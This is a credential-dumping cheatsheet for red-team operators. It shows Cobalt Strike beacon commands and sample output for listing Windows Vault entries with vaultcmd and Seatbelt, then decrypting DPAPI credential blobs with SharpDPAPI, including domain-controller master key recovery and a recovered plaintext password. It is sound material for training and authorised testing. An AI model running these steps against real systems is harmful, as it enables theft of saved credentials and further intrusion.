---
title: "Windows Credential Manager · SharpDPAPI and WindowsVault"
description: "Windows Vault enumeration and DPAPI-protected credential decryption using vaultcmd, Seatbelt and SharpDPAPI."
category: "Credential Dumping"
tools: ["Cobalt Strike", "vaultcmd", "Seatbelt", "SharpDPAPI"]
updated: 2026-11-10
tags: ["credentials", "windows", "dpapi"]
draft: false
---

## 1. Concepts and context

Credential Manager stores secrets that the user has asked Windows to remember, such as Remote Desktop credentials. Entries include a target, an identity and material protected with DPAPI.

DPAPI master keys protect the keys or data in the credential blob. Decryption requires the appropriate master key or an authorized recovery mechanism. Enumerating metadata does not recover the password.

These examples can run at medium integrity in the owning user's context, provided the necessary material and permissions are available. This does not imply access to other users' vaults.

## 2. Enumeration with vaultcmd

The output identifies saved entries and targets without displaying passwords.

```shell
# Enumerate vault credentials; this does not display the password
beacon> run vaultcmd /listcreds:"Windows Credentials" /all
# Credentials in vault: Windows Credentials
# Credential schema: Windows Domain Password Credential
# Resource: Domain:target=TERMSRV/10.10.120.10
# Identity: Administrator
# Hidden: No
# Roaming: No
```

## 3. Inspection with Seatbelt

`WindowsVault` lists vaults and their items. An empty `Credential` field does not prove that no secret exists.

```shell
# Query Windows Vault entries in the user context
# OPSEC — execute-assembly runs .NET code; do not assume it is less detectable than vaultcmd.
beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsVault
# ====== WindowsVault ======
# Vault Type : Web Credentials
# Item count : 0
# Vault Type : Windows Credentials
# Item count : 1
# Resource   : String: Domain:target=TERMSRV/lon-ws-1
# Identity   : String: LON-WS-1\Administrator
# Credential :
# LastModified : 14/02/2025 14:02:28

# An empty Credential field here does not mean there is no saved credential.
```

## 4. Decryption with SharpDPAPI

`credentials` searches the user's credential blobs and attempts to decrypt them. Available keys may allow local decryption. `/rpc` requests master key recovery from the domain controller through MS-BKRP; this requires a compatible context, connectivity and blob protection.

```shell
# Decrypt credentials using /rpc to request master key recovery from the DC
# OPSEC — /rpc adds communication with the domain controller through MS-BKRP.
# To limit further target interaction, analyze material already available in the example offline,
# if the required keys are available; this does not remove traces of its earlier collection.
# BOFs and in-memory execution do not guarantee lower detection.
beacon> execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe credentials /rpc
# Folder        : C:\Users\pchilds\AppData\Local\Microsoft\Credentials\
# CredFile      : 9CAEEF854B7702E986B47C751DFE9AD2
# guidMasterKey : {120b3a8a-683d-4db8-8f13-e4c466949bd2}
# description   : Local Credential Data
# TargetName    : Domain:target=TERMSRV/lon-ws-1
# UserName      : LON-WS-1\Administrator
# Credential    : Passw0rd!

# The password appears only if decryption succeeds in the current context.
```

## 5. Interpreting results

| Field | Purpose |
|---|---|
| `Resource` / `TargetName` | Target associated with the credential |
| `Identity` / `UserName` | Saved account |
| `guidMasterKey` | Identifier of the required master key |
| `CredFile` | Credential blob being analyzed |
| `Credential` | Recovered secret, if decryption succeeds |

If decryption fails, check the effective user, available keys and DC access for `/rpc`. A `TERMSRV` entry identifies a saved target; it does not prove the service remains reachable or the password is still valid.

Reference: [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI/blob/master/README.md).

## 6. Quick checklist

Run these commands in Beacon. Start with metadata enumeration; choose a decryption method only when required and supported by the current context.

```text
IDENTITY AND METADATA
[ ] getuid → confirm the effective user
[ ] shell whoami /user → identify the user and SID
[ ] run vaultcmd /listcreds:"Windows Credentials" /all → enumerate saved entries
[ ] execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe WindowsVault
[ ] Record vault, target and identity; an empty Credential field does not prove absence

DECRYPTION — CHOOSE THE APPLICABLE METHOD
[ ] execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe credentials
    → attempt decryption with the locally available material
[ ] If DC recovery is required and available:
    execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe credentials /rpc
[ ] Review CredFile, guidMasterKey, TargetName, UserName and Credential
[ ] Distinguish successful enumeration from successful decryption
[ ] Do not assume a stored password remains valid
```


## Related references

- [Browser credentials](/cheatsheets/browser-credentials-cheatsheet/)
- [LSASS, SAM, LSA Secrets and cached credentials](/cheatsheets/os-credential-dumping-cheatsheet/)
- [Kerberos: roasting and local tickets](/cheatsheets/kerberos-credential-access-cheatsheet/)
